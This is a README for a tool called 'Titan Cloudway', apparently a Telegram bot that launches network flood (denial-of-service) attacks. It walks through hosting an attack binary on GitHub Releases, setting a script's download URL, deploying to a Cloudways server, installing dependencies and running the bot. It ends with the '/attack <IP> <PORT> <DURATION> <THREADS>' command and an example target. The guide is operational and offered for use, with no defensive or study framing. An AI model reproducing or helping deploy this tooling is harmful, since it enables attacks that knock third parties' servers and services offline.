# TITAN CLOUDWAY - FULLY AUTOMATED

## 🔹 How to Use (Without Sudo)

### 1️⃣ Upload `titan_rust_cloudway` to GitHub
1. Go to **GitHub** → **Create a new repository** (`TitanCloudway`).
2. Click **Releases** → **Create a new release**.
3. Upload **`titan_rust_cloudway`** as an asset.
4. Copy the **direct download link**, which will look like this:
   ```
   https://github.com/YOUR_USERNAME/YOUR_REPO/releases/latest/download/titan_rust_cloudway
   ```

### 2️⃣ Edit `titan_cloudway.py`
- Open `titan_cloudway.py` in a text editor.
- Replace this line:
  ```python
  BINARY_URL = "https://github.com/YOUR_USERNAME/YOUR_REPO/releases/latest/download/titan_rust_cloudway"
  ```
  with your actual **GitHub download link**.

### 3️⃣ Upload `titan_cloudway.py` to Cloudways
Use **SFTP** or **SCP** to upload `titan_cloudway.py` to your Cloudways server.

### 4️⃣ Install Dependencies on Cloudways
```bash
pip install pyTelegramBotAPI requests
```

### 5️⃣ Run the Telegram Bot
```bash
python3 titan_cloudway.py
```

### 6️⃣ Send an Attack Command in Telegram
```
/attack <IP> <PORT> <DURATION> <THREADS>
```
Example:
```
/attack 192.168.1.1 80 30 5
